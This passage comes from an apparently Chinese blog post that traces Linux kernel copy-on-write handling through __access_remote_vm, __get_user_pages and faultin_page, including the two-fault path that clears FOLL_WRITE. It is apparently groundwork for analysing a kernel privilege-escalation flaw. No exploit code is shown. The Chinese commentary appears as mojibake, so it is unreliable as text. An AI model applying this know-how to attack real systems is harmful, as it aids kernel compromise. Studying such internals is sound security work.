‡å†…å­˜é¡µ</span></span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123; <span class="comment">//å¤±è´¥äº†ï¼Œæœªèƒ½è·å–åˆ°ç”¨æˆ·é¡µ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ©ç”¨ kmap ä¸ºè·å–åˆ°çš„é¡µé¢å»ºç«‹ä¸´æ—¶æ˜ å°„ï¼Œå› ä¸ºæˆ‘ä»¬è·å–çš„æ˜¯ page ç»“æ„ä½“ï¼Œéœ€è¦æ˜ å°„åˆ°ä¸€ä¸ªè™šæ‹Ÿåœ°å€ä¹‹åæ‰èƒ½è¿›è¡Œå†™å…¥</span></span><br><span class="line">			maddr = kmap(page);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * åˆ†ä¸¤ç§æƒ…å†µï¼šè¯»/å†™</span></span><br><span class="line"><span class="comment">            * å†…æ ¸å°† read/write çš„æµç¨‹ç»Ÿä¸€äº mm_rw() å‡½æ•°ä¸­ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸Šå±‚å‡½æ•°æ˜¯ &#x27;mem_rw&#x27; è€Œä¸æ˜¯ &#x27;mem_read/mem_write&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes); <span class="comment">// å‘å¯¹åº”å†…å­˜é¡µå†™å…¥æ•°æ®</span></span><br><span class="line">				set_page_dirty_lock(page);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes); <span class="comment">// ä»å¯¹åº”å†…å­˜é¡µè¯»å–æ•°æ®</span></span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);</span><br><span class="line">			page_cache_release(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä¸»è¦å°±åˆ†å¦‚ä¸‹å‡ æ­¥ï¼š</p>
<ul>
<li>é€šè¿‡ <code>get_user_pages()</code> è·å–åˆ°å¯¹åº”çš„å†…å­˜é¡µï¼ˆæ³¨æ„è¿™é‡Œè·å–çš„æ˜¯ <code>page</code> ç»“æ„ä½“ï¼Œå› ä¸ºè¯¥ç‰©ç†é¡µä¸ä¸€å®šæœ‰æ˜ å°„ï¼‰</li>
<li>é€šè¿‡ <code>kmap()</code> æˆ–è®¸åˆ°è¯¥å†…å­˜é¡µæ˜ å°„åˆ°çš„è™šæ‹Ÿåœ°å€ï¼ˆè‹¥æ— åˆ™ä¼šå»ºç«‹æ–°çš„ä¸´æ—¶æ˜ å°„ï¼‰</li>
<li>é€šè¿‡ <code>copy_from_user_page()/copy_to_user_page()</code> è¯»&#x2F;å†™å¯¹åº”çš„å†…å­˜é¡µ</li>
</ul>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œä¸»è¦å…³æ³¨ç‚¹åœ¨å†™ä¹‹å‰â€”â€”è¯¥å‡½æ•°ä½¿ç”¨ <code>get_user_pages()</code> è·å–å¯¹åº”çš„å†…å­˜é¡µï¼Œä¸»è¦è¿˜æ˜¯å¥—å¨ƒï¼Œå…¶ä¼šè°ƒç”¨ <code>__get_user_pages_locked()</code> ï¼Œè¯¥å‡½æ•°æœ€ç»ˆè°ƒç”¨ <code>__get_user_pages()</code>ï¼Œå®šä¹‰äº <code>mm/gup.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œåº”å½“æœ‰ä¸€å¤§æ®µæ³¨é‡Š...è‡ªå·±å»çœ‹æºç å•¦ï¼</span></span><br><span class="line"><span class="type">long</span> __get_user_pages(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> nr_pages,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> gup_flags, <span class="keyword">struct</span> page **pages,</span><br><span class="line">		<span class="keyword">struct</span> vm_area_struct **vmas, <span class="type">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> page_increm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line">		<span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">			vma = find_extend_vma(mm, start);</span><br><span class="line">			<span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line">				<span class="type">int</span> ret;</span><br><span class="line">				ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">						gup_flags, &amp;vma,</span><br><span class="line">						pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret)</span><br><span class="line">					<span class="keyword">return</span> i ? : ret;</span><br><span class="line">				page_mask = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line">				<span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line">			<span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">				i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">						&amp;start, &amp;nr_pages, i,</span><br><span class="line">						gup_flags);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<span class="comment">// è·å–è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†é¡µï¼ˆpageç»“æ„ä½“ï¼‰</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;<span class="comment">// å¤±è´¥äº†</span></span><br><span class="line">            		<span class="comment">/*</span></span><br><span class="line"><span class="comment">            		/* ä¸¤ç§åŸå› ï¼š</span></span><br><span class="line"><span class="comment">            		* (1) ä¸å­˜åœ¨å¯¹åº”çš„ç‰©ç†é¡µï¼ˆæœªä¸ç‰©ç†é¡µè§å»ºç«‹ç›¸åº”çš„æ˜ å°„å…³ç³»ï¼‰</span></span><br><span class="line"><span class="comment">            		* (2) å­˜åœ¨è¿™æ ·çš„ç‰©ç†é¡µï¼Œä½†æ˜¯æ²¡æœ‰ç›¸åº”çš„æ“ä½œæƒé™ï¼ˆå¦‚è¯¥é¡µä¸å¯å†™ï¼‰</span></span><br><span class="line"><span class="comment">            		* åœ¨ COW æµç¨‹ä¸­ä¼šå…ˆèµ°(1)ï¼Œç„¶åèµ°(2)</span></span><br><span class="line"><span class="comment">            		*/</span></span><br><span class="line">			<span class="type">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);<span class="comment">//ã€æ ¸å¿ƒã€‘å¤„ç†ç¼ºé¡µå¼‚å¸¸</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;<span class="comment">//æˆåŠŸå¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œå›å»é‡æ–°å°è¯•è°ƒé¡µ</span></span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment">			 * struct page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">goto</span> next_page;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">			<span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">next_page:</span><br><span class="line">		<span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">			vmas[i] = vma;</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line">		<span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">			page_increm = nr_pages;</span><br><span class="line">		i += page_increm;</span><br><span class="line">		start += page_increm * PAGE_SIZE;</span><br><span class="line">		nr_pages -= page_increm;</span><br><span class="line">	&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>

<p>COWçš„ä¸¤ä¸ªè¦ç‚¹ï¼š</p>
<ul>
<li>åœ¨æˆ‘ä»¬ç¬¬ä¸€æ¬¡å°è¯•è®¿é—®æŸä¸ªå†…å­˜é¡µæ—¶ï¼Œç”±äºå»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼ŒLinuxå°šæœªå»ºç«‹èµ·è¯¥é¡µä¸å¯¹åº”ç‰©ç†é¡µé—´çš„æ˜ å°„ï¼Œæ­¤æ—¶ <code>follow_page_mask()</code> è¿”å› NULLï¼›ç”±äºæ²¡è·å–åˆ°å¯¹åº”å†…å­˜é¡µï¼Œæ¥ä¸‹æ¥è°ƒç”¨ <code>faultin_page()</code> å‡½æ•°è§£å†³ç¼ºé¡µå¼‚å¸¸ï¼Œåˆ†é…ç‰©ç†é¡µ</li>
<li>è°ƒç”¨ <code>faultin_page()</code> å‡½æ•°æˆåŠŸè§£å†³ç¼ºé¡µå¼‚å¸¸ä¹‹åä¼šå›åˆ° <code>retry</code> æ ‡ç­¾ï¼Œæ¥ä¸‹æ¥ä¼šé‡æ–°è°ƒç”¨ <code>follow_page_mask()</code> ï¼Œè€Œè‹¥æ˜¯å½“å‰è¿›ç¨‹å¯¹äºè¯¥é¡µæ²¡æœ‰å†™æƒé™ï¼ˆäºŒçº§é¡µè¡¨æ ‡è®°ä¸ºä¸å¯å†™ï¼‰ï¼Œåˆ™è¿˜æ˜¯ä¼šè¿”å›NULLï¼›ç”±äºæ²¡è·å–åˆ°å¯¹åº”å†…å­˜é¡µï¼Œæ¥ä¸‹æ¥è°ƒç”¨ <code>faultin_page()</code> å‡½æ•°è§£å†³ç¼ºé¡µå¼‚å¸¸ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶</li>
</ul>
<p>åˆ°äº†è¿™é‡Œï¼Œ<code>mem_rw()</code> å¤§è‡´çš„æµç¨‹ä¾¿ä¸€ç›®äº†ç„¶äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mem_rw()</span><br><span class="line">	__get_free_page()//è·å–ç©ºé—²é¡µï¼Œå°†è¦å†™å…¥çš„æ•°æ®è¿›è¡Œæ‹·è´</span><br><span class="line">	access_remote_vm()</span><br><span class="line">		__access_remote_vm()// å†™å…¥æ•°æ®ï¼Œæ‰§è¡Œ write è¿™ä¸€ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒåŠŸèƒ½</span><br><span class="line">			get_user_pages()</span><br><span class="line">				__get_user_pages_locked()</span><br><span class="line">					__get_user_pages()//è·å–å¯¹åº”çš„ç”¨æˆ·è¿›ç¨‹çš„å†…å­˜é¡µ</span><br><span class="line">						follow_page_mask()//è°ƒå†…å­˜é¡µçš„æ ¸å¿ƒå‡½æ•°</span><br><span class="line">						faultin_page()//è§£å†³ç¼ºé¡µå¼‚å¸¸</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ¥åˆ°ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†å‡½æ•° <code>faultin_page()</code> çš„æµç¨‹ã€‚</p>
<h3 id="ç¬¬ä¸€æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸"><a href="#ç¬¬ä¸€æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="ç¬¬ä¸€æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸"></a>ç¬¬ä¸€æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</h3><p>ç”±äº Linux çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªå†…å­˜é¡µä¹‹å‰ Linux kernel å¹¶ä¸ä¼šä¸ºå…¶åˆ†é…ç‰©ç†é¡µï¼Œäºæ˜¯æˆ‘ä»¬æ²¡æ³•è·å–åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œ <code>follow_page_mask()</code> è¿”å› NULLï¼Œæ­¤æ—¶ä¾¿ä¼šè¿›å…¥ <code>faultin_page()</code> å‡½æ•°å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>mm/gup.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">faultin_page</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">int</span> *flags, <span class="type">int</span> *nonblocking)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">			(stack_guard_page_start(vma, address) ||</span><br><span class="line">			 stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)<span class="comment">//å› ä¸ºæˆ‘ä»¬è¦å†™å…¥è¯¥é¡µï¼Œæ‰€ä»¥è¯¥æ ‡å¿—ä½å­˜åœ¨</span></span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">	<span class="keyword">if</span> (nonblocking)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">		fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);<span class="comment">//åˆ†é…å†…å­˜é¡µ</span></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line">			<span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tsk) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">			tsk-&gt;maj_flt++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			tsk-&gt;min_flt++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nonblocking)</span><br><span class="line">			*nonblocking = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<span class="comment">//ç¬¬äºŒæ¬¡ç¼ºé¡µå¼‚å¸¸ä¼šèµ°åˆ°è¿™é‡Œï¼Œæ¸…é™¤ FOLL_WRITE æ ‡å¿—ä½</span></span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´çš„è°ƒç”¨æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()//å‘ç°pteä¸ºç©ºï¼Œç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µ</span><br><span class="line">                do_fault()//éåŒ¿åé¡µï¼Œç›´æ¥è°ƒå…¥</span><br><span class="line">                    do_cow_fault()//æˆ‘ä»¬è¦å†™å…¥è¯¥é¡µï¼Œæ‰€ä»¥èµ°åˆ°äº†è¿™é‡Œ</span><br><span class="line">                    	do_set_pte()</span><br><span class="line">                            maybe_mkwrite()</span><br><span class="line">                                pte_mkdirty()//å°†è¯¥é¡µæ ‡è„</span><br></pre></td></tr></table></figure>

<p>ä¹‹åè¯¥é¡µè¢«è°ƒå…¥ä¸»å­˜ä¸­ï¼Œä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å¹¶æ— å¯¹è¯¥é¡µçš„å†™æƒé™</p>
<h3 id="ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸"><a href="#ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸"></a>ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</h3><p>è™½ç„¶æˆ‘ä»¬æˆåŠŸè°ƒå…¥äº†å†…å­˜é¡µï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬å¯¹è¯¥é¡µå¹¶æ— å†™æƒé™ï¼Œ <code>follow_page_mask()</code> ä¾æ—§ä¼šè¿”å› NULL ï¼Œå†æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œäºæ˜¯æˆ‘ä»¬å†æ¬¡è¿›å…¥ <code>faultin_page()</code> å‡½æ•°ï¼Œæ¥åˆ°äº†<strong>ã€Œå†™æ—¶å¤åˆ¶ã€</strong>çš„æµç¨‹ï¼Œç»†èŠ‚åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p>
